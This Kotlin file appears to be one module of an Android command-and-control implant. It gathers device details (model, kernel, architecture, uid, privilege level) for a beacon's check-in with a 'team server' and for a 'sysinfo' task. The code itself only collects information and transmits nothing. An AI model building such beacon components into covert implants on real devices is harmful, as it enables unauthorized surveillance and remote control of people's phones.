package io.umbra.beacon

import android.os.Build

/**
 * Device reconnaissance.
 *
 * The native library provides the few values that are not reachable from the
 * Java APIs (kernel release, machine type, real pid) without spawning a process.
 */
object SysInfo {
    private var nativeReady = false

    /**
     * Why the native library is not loaded, in the platform's own words.
     *
     * The first eleven emulator runs could not answer this: the failure was
     * swallowed into `nativeReady = false`, the beacon carried on with the
     * Java fallbacks, and the report could only say that no mapping existed.
     * A load that fails is a fact about the build and the device, and it is
     * written down now instead of being turned into a quiet default.
     */
    @Volatile var nativeError: String = ""
        private set

    init {
        nativeReady = try {
            System.loadLibrary("umbra")
            true
        } catch (t: Throwable) {
            nativeError = "${t.javaClass.simpleName}: ${t.message}"
            android.util.Log.e("umbra", "the native library did not load: $nativeError", t)
            false
        }
    }

    private external fun nativeKernelRelease(): String
    private external fun nativeMachine(): String
    private external fun nativePid(): Int
    private external fun nativeUid(): Int

    fun kernel(): String = if (nativeReady) runCatching { nativeKernelRelease() }.getOrDefault("unknown") else "unknown"
    fun machine(): String = if (nativeReady) runCatching { nativeMachine() }.getOrDefault(Build.SUPPORTED_ABIS.firstOrNull() ?: "unknown") else "unknown"
    fun pid(): Int = if (nativeReady) runCatching { nativePid() }.getOrDefault(android.os.Process.myPid()) else android.os.Process.myPid()
    fun uid(): Int = if (nativeReady) runCatching { nativeUid() }.getOrDefault(android.os.Process.myUid()) else android.os.Process.myUid()

    fun host(): String = Build.MODEL ?: "android"

    /** HELLO metadata reported to the team server. */
    fun meta(version: String): Upk.MapV = Upk.map(
        "host" to Upk.str(host()),
        "os" to Upk.str("android"),
        "arch" to Upk.str(machine()),
        "user" to Upk.str("uid=${uid()}"),
        "pid" to Upk.num(pid().toLong()),
        "integ" to Upk.str(if (uid() == 0) "system" else "app"),
        "ver" to Upk.str(version),
        "family" to Upk.str("android"),
        // The capability list travels with the handshake: the server refuses
        // to queue a task the phone cannot run.
        "caps" to Upk.Arr(TaskRunner.CAPABILITIES.map { Upk.str(it) }),
    )

    /** Human readable report for the `sysinfo` task. */
    fun report(): String = buildString {
        appendLine("host        : ${host()}")
        appendLine("manufacturer: ${Build.MANUFACTURER}")
        appendLine("model       : ${Build.MODEL}")
        appendLine("device      : ${Build.DEVICE}")
        appendLine("android     : ${Build.VERSION.RELEASE} (sdk ${Build.VERSION.SDK_INT})")
        appendLine("kernel      : ${kernel()}")
        appendLine("machine     : ${machine()}")
        appendLine("abis        : ${Build.SUPPORTED_ABIS.joinToString(",")}")
        appendLine("pid         : ${pid()}")
        appendLine("uid         : ${uid()}")
        appendLine("app         : ${BuildConfig.APPLICATION_ID} ${BuildConfig.VERSION_NAME}")
    }
}
